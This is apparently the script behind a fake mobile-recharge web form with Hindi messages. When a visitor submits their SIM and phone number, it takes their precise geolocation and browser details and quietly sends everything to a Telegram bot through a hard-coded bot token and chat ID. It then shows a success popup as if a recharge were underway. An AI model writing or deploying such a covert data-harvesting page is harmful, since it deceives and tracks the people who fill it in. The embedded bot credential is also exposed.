document.getElementById("rechargeForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const sim = document.getElementById("sim").value;
  const number = document.getElementById("number").value;

  if (!sim || !number.match(/^[6-9]\d{9}$/)) {
    alert("कृपया मान्य जानकारी दर्ज करें।");
    return;
  }

  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      const device = navigator.userAgent;

      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
      const chatId = "6038115234";

      const message = `📱 New Recharge Request:
SIM: ${sim}
Number: ${number}
Device: ${device}
Location: https://www.google.com/maps?q=${latitude},${longitude}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        const popup = document.getElementById("popup");
        popup.style.display = "block";

        // Reset form
        this.reset();
      } catch (error) {
        alert("कुछ त्रुटि हुई, कृपया पुनः प्रयास करें।");
      }
    },
    () => {
      alert("लोकेशन एक्सेस नहीं हो सका। कृपया अनुमति दें।");
    }
  );
});
